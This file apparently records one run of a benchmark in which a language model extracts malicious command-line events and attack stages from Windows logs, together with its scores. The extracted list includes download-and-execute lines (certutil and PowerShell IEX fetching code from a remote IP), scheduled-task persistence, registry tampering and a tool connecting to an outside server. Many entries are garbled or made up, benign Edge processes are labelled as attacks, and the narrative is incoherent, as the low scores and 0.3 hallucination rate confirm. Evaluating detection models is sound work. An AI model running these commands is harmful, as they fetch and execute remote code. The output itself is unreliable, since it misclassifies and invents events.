@@ -1,0 +1,238 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\msedge.exe --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA=",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\msedge.exe --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=8 --launch-time-ticks=268904258981 --mojo-platform-channel-handle=3380 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_16005.14326.20858.0_x64__8wekyb3d8bbwe\\HxOutlook.exe -ServerName:microsoft.windowslive.mail.AppXfbjsbkxvprcgqg6q4c9jfr0pn3kv9x5s.mca",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:C\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\DEVOBJ.dll",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u1E72.ucliju65ir.rs1.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @$\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\4iwlyhn4\\\\4iwlyhn4.cmdline\\\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\\\Users\\\\ADMINI~~1\\\\AppData\\\\Local\\\\Temp\\\\RES34B4.tmp\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\" IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a')) \\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "schtasks /delete /tn test /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-AtomicTest T1134.001 -TestNumbers 1\\\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "get-secmenuletter",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "[System.Net.HttpWebRequest] :: Create 'http://124.223.85.207:8082'); $request.Method = 'POST'; $postFields = '{\"message\":\"{\"function\":\"kernel32.dll.GetProcAddress\",\"args\":[{\"arg0\":\"kernel32.dll\",\"arg1\":\"GetProcAddress\"}]}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest t1547.001 -TestNumbers 1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg delete \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'; Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": ".\\chromeRemoteServices.ps1",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-URLCacheClear T1059.001 -CleanUrls ClearAll\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-URLCacheClear T1059.001 -CleanUrls ClearAll\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-URLCacheClear T1059.001 -CleanUrls ClearAll\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "[Reflection.Assembly]::LoadWithPartialName ('System.IO.Compression.FileSystem'), \"Add-Type -AssemblyName System.IO.Compression.FileSystem\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI]::CreateThread ([IntPtr ]::Zero,[UIntPtr ]::new(0),[Void]* ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI]::CreateThread ([IntPtr ]::Zero,[UIntPtr ]::new(0),[Void]* ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI]::CreateThread ([IntPtr ]::Zero,[UIntPtr ]::new(0),[Void]* ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"advapi32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI ].enum_logon_type(3)",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"advapi32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI ].enum_logon_type(3)",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"advapi32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI ].enum_logon_type(3)",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -Command \"Add-Type -MemberDefinition '[DllImport(\"advapi32.dll\")]' -Name WinAPI -Namespace WinAPI -PassThru; [WinAPI ].enum_logon_type(3)",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -Command \"[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem'), \"Add-Type -AssemblyName System.IO.Compression.FileSystem\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "py.exe \"C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "py.exe \"C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "python.exe \"C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "python.exe \"C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "Cmd.exe /c  CertUtil -Decode HexadecimalString 0x314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798 x C:\\users\\admin\\desktop\\hooksslx64.dll\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd.exe /c start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers initiated the attack with an unknown method of initial access, then established a connection using Edge, which indicates evasion techniques were employed. Initially, they gathered information using HxOutlook and accessed Edge's renderer process, further suggesting access to valid credentials. Following this, they ran powershell commands aimed at cleaning up URL caches, deleting image file execution options, and clearing assembly references.\n\nAfter discovering useful processes, the attackers began deploying persistence mechanisms, establishing network communication via shellcode downloads, executing arbitrary code using python scripts and invoking atomic tests to discover local machine properties. During the last phase, they saved data onto disk in order to manipulate registry entries related to image file execution options.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 126760,
+      "completion_tokens": 11336,
+      "total_tokens": 138096,
+      "wall_clock_s": 156.854,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1702127659574468,
+      "recall": 0.34782608695652173,
+      "f1": 0.22857142857142854,
+      "tp": 8,
+      "fp": 39,
+      "fn": 15
+    },
+    "stage": {
+      "precision": 0.06382978723404255,
+      "recall": 0.125,
+      "f1": 0.08450704225352113,
+      "tp": 3,
+      "fp": 44,
+      "fn": 21,
+      "recall_partial": 0.21739130434782608
+    },
+    "hallucination_rate": 0.3,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 126760,
+      "completion_tokens": 11336,
+      "total_tokens": 138096,
+      "wall_clock_s": 156.854,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
